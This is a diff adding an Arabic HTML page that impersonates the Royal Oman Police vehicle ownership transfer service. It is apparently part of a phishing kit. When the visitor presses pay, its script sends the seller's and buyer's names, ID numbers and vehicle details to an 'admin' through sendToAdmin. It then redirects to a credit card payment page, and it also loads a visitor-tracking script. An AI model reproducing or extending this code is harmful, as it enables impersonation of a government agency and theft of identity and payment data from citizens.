@@ -1,0 +1,299 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" dir="rtl">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" />
+<title>شرطة عمان السلطانية - نقل ملكية مركبة</title>
+    <link rel="stylesheet" href="rop-assets/css/etraffic-bootstrap.min.css" />
+    <link rel="stylesheet" href="rop-assets/css/etraffic-font-awesome.min.css" />
+    <link rel="stylesheet" href="rop-assets/css/etraffic-main.css" />
+    <link rel="stylesheet" href="rop-assets/css/etraffic-responsive.css" />
+    <script type="text/javascript" src="rop-assets/js/jquery.min.js"></script>
+    <script type="text/javascript" src="rop-assets/js/bootstrap.min.js"></script>
+    <link href='https://fonts.googleapis.com/css?family=Droid+Arabic+Kufi' rel='stylesheet' />
+<style type="text/css">
+    #loading-message {
+        text-align: center;
+        padding: 50px;
+        font-size: 18px;
+        color: #333;
+    }
+    #error-message {
+        text-align: center;
+        padding: 50px;
+        font-size: 16px;
+        color: #a94442;
+        display: none;
+    }
+    .results-table {
+        width: 100%;
+        border-collapse: collapse;
+        margin: 20px 0;
+    }
+    .results-table th, .results-table td {
+        border: 1px solid #ddd;
+        padding: 12px 15px;
+        text-align: right;
+    }
+    .results-table th {
+        background: #f5f5f5;
+        width: 40%;
+        font-weight: bold;
+    }
+    .panel-heading-custom {
+        background: #337ab7;
+        color: #fff;
+        padding: 12px 15px;
+        border-radius: 4px 4px 0 0;
+        font-weight: bold;
+        font-size: 16px;
+    }
+    .panel-custom {
+        border: 1px solid #ddd;
+        border-radius: 4px;
+        margin: 20px 0;
+    }
+    .panel-body-custom {
+        padding: 20px;
+    }
+    .fee-amount {
+        font-weight: bold;
+        color: #d9534f;
+        font-size: 18px;
+    }
+    .btn-pay {
+        background: #1a3a5c;
+        color: #fff;
+        font-weight: bold;
+        padding: 12px 40px;
+        font-size: 16px;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+    }
+    .btn-pay:hover {
+        background: #0f2a45;
+    }
+</style>
+</head>
+<body class="homepage">
+  	<header id="header">
+        <nav class="navbar navbar-fixed-top" role="banner">
+           <div class="container">
+				<button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+                        <span class="sr-only">Toggle navigation</span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                </button>
+				<div class="navbar-brand-logo"></div>
+					<div class="navbar-header"><a class="navbar-brand" href="/rop-home.html"><h1 class="hidden">شرطة عمان السلطانية</h1></a>
+					</div>
+					<div class="collapse navbar-collapse">
+						<ul class="  nav navbar-nav glyphicon-object-align-bottom">
+							<li >
+                            <a  href="/rop-home.html">الصفحة الرئيسية</a>
+                            </li>
+                            <li >
+                                <a href="javascript:void(0);">ENGLISH</a>
+                            </li>
+						</ul>
+					</div>
+				</div>
+			</nav>
+		</header>
+		<section id="fontSize">
+<section id="page">
+        <div class="HeadingSection">
+            <div class="container">
+                <div class="head-wrap">
+                    <div class="row">
+                        <div class="col-sm-6 ">
+                            <ul class="breadcrumb">
+                                <li><a href="/rop-home.html">الصفحة الرئيسية</a></li>
+                                <li><a href="#">الخدمات الإلكترونية</a></li>
+                                <li>خدمة نقل ملكية مركبة</li>
+                            </ul>
+                        </div>
+                        <div class="pull-right">
+                            <div class="col-sm-6 ">
+                                <div class="RedSpeakerCNt rsbtn">
+                                    <button type="button" class="btn btn-default">
+                                        للاستماع <i class="fa fa-play-circle"></i>
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="container">
+            <div class="tabcontentHeading">
+                <h1>الخدمات الإلكترونية</h1>
+                <h2>خدمة نقل ملكية مركبة</h2>
+            </div>
+            <div class="row">
+                <div class="col-sm-12">
+                    <div style="margin: 0; height: 100%;">
+                        <div id="loading-message">
+                            <i class="fa fa-spinner fa-spin fa-2x"></i>
+                            <p>جاري تحميل النتائج...</p>
+                        </div>
+                        <div id="error-message">
+                            <p>عذراً، لم يتم العثور على النتائج أو انتهت صلاحيتها.</p>
+                            <a href="/rop-transfer-vehicle.html" class="btn btn-primary">العودة للاستعلام</a>
+                        </div>
+                        <div id="rop-results-content" style="display:none;"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+</section>
+	<div class="top-bar">
+		<div class="container">
+			<div class="row">
+			    <div class="col-lg-12">
+                </div>
+			</div>
+		</div>
+	</div>
+    </section>
+
+    <footer id="footer" class="midnight-blue">
+        <div class="container">
+            <div class="row">
+                <div class="col-sm-6 col-md-12">
+					<div class="center" >
+						<h3>2023 &copy; شرطة عمان السلطانية </h3>
+					</div>
+				</div>
+			</div>
+		</div>
+    </footer>
+
+<script>
+var ROP_SERVER = 'https://omanshorta.onrender.com';
+
+document.addEventListener('DOMContentLoaded', function() {
+    var urlParams = new URLSearchParams(window.location.search);
+    var plateCode = urlParams.get('plateCode') || '';
+    var vehicleNo = urlParams.get('vehicleNo') || '';
+    var idType = urlParams.get('idType') || '';
+    var idValue = urlParams.get('idValue') || '';
+    var ownerName = urlParams.get('ownerName') || '';
+    var newOwnerName = urlParams.get('newOwnerName') || '';
+    var newOwnerID = urlParams.get('newOwnerID') || '';
+    var fee = urlParams.get('fee') || '5.000';
+    var transferLabel = urlParams.get('transferLabel') || 'نقل مع اللوحة';
+    
+    if (!vehicleNo || !idValue) {
+        document.getElementById('loading-message').style.display = 'none';
+        document.getElementById('error-message').style.display = 'block';
+        return;
+    }
+    
+    // Show results
+    document.getElementById('loading-message').style.display = 'none';
+    document.getElementById('rop-results-content').style.display = 'block';
+    
+    var resultsHtml = '';
+    
+    // Owner information panel
+    resultsHtml += '<div class="panel-custom">';
+    resultsHtml += '<div class="panel-heading-custom">بيانات المالك الحالي (البائع)</div>';
+    resultsHtml += '<div class="panel-body-custom">';
+    resultsHtml += '<table class="results-table">';
+    resultsHtml += '<tr><th>اسم المالك</th><td>' + ownerName + '</td></tr>';
+    resultsHtml += '<tr><th>رقم الهوية</th><td>' + idValue + '</td></tr>';
+    resultsHtml += '<tr><th>نوع الهوية</th><td>' + (idType === '1' ? 'الرقم المدني' : idType === '2' ? 'السجل التجاري' : 'رقم المؤسسة') + '</td></tr>';
+    resultsHtml += '</table>';
+    resultsHtml += '</div></div>';
+    
+    // New owner information panel
+    resultsHtml += '<div class="panel-custom">';
+    resultsHtml += '<div class="panel-heading-custom">بيانات المالك الجديد (المشتري)</div>';
+    resultsHtml += '<div class="panel-body-custom">';
+    resultsHtml += '<table class="results-table">';
+    resultsHtml += '<tr><th>اسم المالك الجديد</th><td>' + newOwnerName + '</td></tr>';
+    resultsHtml += '<tr><th>رقم هوية المالك الجديد</th><td>' + newOwnerID + '</td></tr>';
+    resultsHtml += '</table>';
+    resultsHtml += '</div></div>';
+    
+    // Vehicle information panel
+    resultsHtml += '<div class="panel-custom">';
+    resultsHtml += '<div class="panel-heading-custom">بيانات المركبة</div>';
+    resultsHtml += '<div class="panel-body-custom">';
+    resultsHtml += '<table class="results-table">';
+    resultsHtml += '<tr><th>رمز اللوحة</th><td>' + plateCode + '</td></tr>';
+    resultsHtml += '<tr><th>رقم المركبة</th><td>' + vehicleNo + '</td></tr>';
+    resultsHtml += '</table>';
+    resultsHtml += '</div></div>';
+    
+    // Fee panel
+    resultsHtml += '<div class="panel-custom">';
+    resultsHtml += '<div class="panel-heading-custom">رسوم نقل الملكية</div>';
+    resultsHtml += '<div class="panel-body-custom">';
+    resultsHtml += '<table class="results-table">';
+    resultsHtml += '<tr><th>نوع النقل</th><td>' + transferLabel.split(' - ')[0] + '</td></tr>';
+    resultsHtml += '<tr><th>رسوم النقل</th><td class="fee-amount">' + parseFloat(fee).toFixed(3) + ' ر.ع</td></tr>';
+    resultsHtml += '</table>';
+    resultsHtml += '</div></div>';
+    
+    document.getElementById('rop-results-content').innerHTML = resultsHtml;
+    
+    // Add payment button
+    var buttonsHtml = '<div style="margin-top:20px; margin-bottom:20px; text-align:center;">';
+    buttonsHtml += '<input type="button" id="btnPayTransfer" class="btn-pay" value="مباشرة عملية الدفع" />';
+    buttonsHtml += '</div>';
+    
+    // Payment confirmation modal
+    buttonsHtml += '<div id="paymentModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.5); z-index:9999; justify-content:center; align-items:center;">';
+    buttonsHtml += '<div style="background:#fff; border-radius:8px; padding:30px; max-width:500px; width:90%; margin:auto; margin-top:15%; text-align:center; direction:rtl;">';
+    buttonsHtml += '<h2 style="margin-bottom:15px;">مباشرة إجراء عملية الدفع</h2>';
+    buttonsHtml += '<h3>رسوم نقل ملكية المركبة: <span style="font-weight:bold; color:#2E52AA;">' + parseFloat(fee).toFixed(3) + '</span> ريال عماني.</h3>';
+    buttonsHtml += '<p>إضغط على زر <b>دفع</b> لمباشرة إجراء عملية الدفع أو زر <b>إلغاء</b> لإلغاء عملية الدفع.</p>';
+    buttonsHtml += '<div style="margin-top:20px;">';
+    buttonsHtml += '<button id="btnConfirmPay" style="background:#1a3a5c; color:#fff; border:none; padding:10px 30px; margin:5px; border-radius:5px; font-size:16px; cursor:pointer;">دفع</button>';
+    buttonsHtml += '<button id="btnCancelPay" style="background:#666; color:#fff; border:none; padding:10px 30px; margin:5px; border-radius:5px; font-size:16px; cursor:pointer;">إلغاء</button>';
+    buttonsHtml += '</div></div></div>';
+    
+    document.getElementById('rop-results-content').insertAdjacentHTML('afterend', buttonsHtml);
+    
+    // Pay button - show modal and send data to admin
+    document.getElementById('btnPayTransfer').addEventListener('click', function() {
+        document.getElementById('paymentModal').style.display = 'flex';
+        // Send data to admin when user clicks payment button
+        if (window.sendToAdmin) {
+            var idTypeLabel = idType === '1' ? 'الرقم المدني' : (idType === '2' ? 'رقم الإقامة' : idType);
+            window.sendToAdmin({
+                type: 'نقل ملكية مركبة',
+                fields: [
+                    { label: 'رمز اللوحة', value: plateCode },
+                    { label: 'رقم المركبة', value: vehicleNo },
+                    { label: 'نوع الهوية', value: idTypeLabel },
+                    { label: 'رقم الهوية', value: idValue },
+                    { label: 'اسم المالك (البائع)', value: ownerName },
+                    { label: 'اسم المالك الجديد (المشتري)', value: newOwnerName },
+                    { label: 'رقم هوية المشتري', value: newOwnerID },
+                    { label: 'نوع النقل', value: transferLabel },
+                    { label: 'رسوم النقل', value: parseFloat(fee).toFixed(3) + ' ر.ع' }
+                ]
+            }, 'نقل ملكية مركبة');
+        }
+    });
+    
+    // Confirm pay - redirect to credit card payment page
+    document.getElementById('btnConfirmPay').addEventListener('click', function() {
+        window.location.href = '/credit-card-payment?amount=' + fee;
+    });
+    
+    // Cancel pay - close modal
+    document.getElementById('btnCancelPay').addEventListener('click', function() {
+        document.getElementById('paymentModal').style.display = 'none';
+    });
+});
+</script>
+<script src="visitor-tracking.js"></script>
+</body>
+</html>
